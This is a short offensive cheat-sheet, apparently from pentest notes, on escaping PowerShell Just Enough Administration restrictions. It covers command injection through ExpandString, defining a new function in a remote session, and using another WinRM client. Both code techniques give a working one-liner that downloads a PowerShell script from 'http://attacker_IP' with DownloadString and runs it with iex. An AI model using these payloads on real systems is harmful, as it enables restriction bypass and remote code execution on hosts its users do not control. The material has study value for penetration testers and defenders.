# Just Enough Administration (JEA) Escape

### 1) Abuse an allowed function

##### Look at allowed functions

    Get-Command

##### Look at the function code

    (Get-Command <function>).Definition

##### Or

    gcm <function> -show

For example if it is possible to control the $param parameter here 

    $ExecutionContext.InvokeCommand.ExpandString($param)

it is possible to execute some code by passing this as argument : 

    '$(powershell.exe -c "iEx (New-Object System.Net.WebClient).DownloadString(''http://attacker_IP/Invoke-HelloWorld.ps1'')")'

### 2) Function Creation

If the JEA allowed to create a new function it can be abused

    Invoke-Command -Session $sess -ScriptBlock {function blackwasp {iex (new-object net.webclient).downloadstring('http://attacker_IP/Invoke-HelloWorld.ps1')}}
    Invoke-Command -Session $sess -ScriptBlock {blackwasp}

### 3) With another WinRM client

Run the specific python script (Scripts directory in the repo to sometimes bypass the JEA)
